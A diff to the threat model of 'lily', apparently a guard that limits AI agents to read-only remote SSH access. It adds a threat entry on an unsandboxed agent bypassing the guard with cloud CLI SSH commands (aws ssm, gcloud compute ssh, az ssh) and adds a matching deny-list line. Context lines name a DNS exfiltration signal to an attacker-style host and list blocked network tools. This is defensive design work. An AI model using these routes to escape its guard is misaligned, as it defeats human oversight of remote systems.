@@ -277,6 +277,12 @@ knows a hostname, it could `dig known-secret.attacker.com` as a signal.
 
 **Mitigation**: Network-level DNS monitoring on the remote host.
 
+### 6. Cloud CLI Bypass
+
+An unsandboxed agent could run `aws ssm start-session`, `gcloud compute ssh`, or `az ssh vm` directly to open an unrestricted SSH session to a cloud instance, bypassing lily's read-only validation.
+
+**Mitigation**: The lily guard hook detects and rewrites these commands to use `lily aws`, `lily gcloud`, or `lily azure` respectively. In a sandboxed environment, the cloud CLIs should not be directly accessible to the agent.
+
 ---
 
 ## Sandbox Deployment Guide
@@ -532,6 +538,7 @@ For maximum security when giving AI agents access to remote hosts:
 │    lily.yaml         ~/.ssh/       └────────────────────────┘  │
 │                                                                  │
 │  ❌ No raw SSH, curl, wget, nc                                   │
+│  ❌ No direct aws/gcloud/az SSH commands                         │
 │  ❌ No write access to ~/.ssh/ or lily.yaml                      │
 │  ❌ No outbound network (except via Lily SSH)                    │
 │  ❌ No ProxyCommand (only ProxyJump supported)                   │
@@ -548,6 +555,7 @@ configured sandbox creates a defense-in-depth posture where:
 5. The agent **cannot** exfiltrate via SSRF (cloud metadata IPs blocked)
 6. The agent **cannot** MITM connections (TOFU host key verification)
 7. The agent **cannot** inject commands via ProxyCommand (not supported)
+8. The agent **cannot** bypass lily via cloud CLI SSH (guard rewrites to lily)
 
 ---
 
